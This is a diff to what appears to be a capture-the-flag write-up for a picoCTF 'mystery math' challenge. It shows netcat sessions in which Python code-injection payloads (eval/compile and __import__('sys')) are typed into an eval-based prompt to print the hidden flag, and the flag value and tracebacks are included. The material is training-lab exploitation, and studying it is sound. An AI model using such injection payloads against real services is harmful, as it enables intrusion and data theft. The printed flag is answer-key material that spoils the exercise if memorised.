@@ -1,9 +1,18 @@
-root@kali32:~$ nc python.picoctf.com 6361
+$ nc python.picoctf.com 6361
 Welcome to mystery math!
 
 Enter number 1> eval ( compile('print(flag);', '<stdout>', 'single') )
 eval_is_best_thing_evar
 Traceback (most recent call last):
+  File "/home/py1/task1.py", line 9, in <module>
+    x = x*x + ord(flag[0]) * ord(flag[1]) + ord(flag[2]) * x
+TypeError: unsupported operand type(s) for *: 'NoneType' and 'NoneType'
+
+# alternatively:
+$ nc python.picoctf.com 6361
+Welcome to mystery math!
+Enter number 1> __import__("sys").stdout.write(flag)
+eval_is_best_thing_evarTraceback (most recent call last):
   File "/home/py1/task1.py", line 9, in <module>
     x = x*x + ord(flag[0]) * ord(flag[1]) + ord(flag[2]) * x
 TypeError: unsupported operand type(s) for *: 'NoneType' and 'NoneType'
